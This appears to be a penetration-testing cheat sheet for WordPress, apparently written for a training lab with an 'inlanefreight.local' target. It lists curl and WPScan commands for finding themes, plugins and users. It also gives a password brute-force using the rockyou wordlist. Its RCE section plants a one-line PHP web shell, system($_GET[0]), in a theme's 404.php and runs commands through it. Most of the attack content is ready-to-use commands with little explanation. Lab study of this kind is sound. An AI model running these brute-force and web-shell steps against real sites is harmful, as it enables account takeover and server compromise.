# Wordpress

## Overview

## Discovery

A quick way to identify a WordPress site is by browsing to the /robots.txt file. A typical robots.txt on a WordPress installation may look like:

```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://inlanefreight.local/wp-sitemap.xml
```

Another quick way to identify a WordPress site is by looking at the page source.

```shell
curl -s http://blog.inlanefreight.local | grep WordPress
```

## Enumeration

### Themes and Plugins

Find the themes:

```shell
curl -s http://blog.inlanefreight.local/ | grep themes
```

Find the plugins:

```shell
curl -s http://blog.inlanefreight.local/ | grep plugins
```

For the plugins found we can try to get there readme.txt to get their version:

```
http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt
```

Check for exploits in both themes and plugins used.

### Users

An invalid username returns that the user was not found. So we can do user enumeration this way.

## Enumeration - Automation

### WPScan

```shell
sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.loca
```

To enumerate users:

```shell
sudo wpscan -e u -t 500 --url http://ir.inlanefreight.local
```

```shell
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
```

We can obtain an API token from WPVulnDB, which is used by WPScan to scan for PoC and reports

## Attacks

### Login Bruteforce

```shell
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
sudo wpscan --url http://ir.inlanefreight.local -U ilfreightwp -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top100.txt
```

### RCE

As admin, edit a used theme 404.php page, with:

```php
system($_GET[0]);
```

Then do

```shell
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

## Ohter Information

Check worpress vulnerabilities in:

https://wpscan.com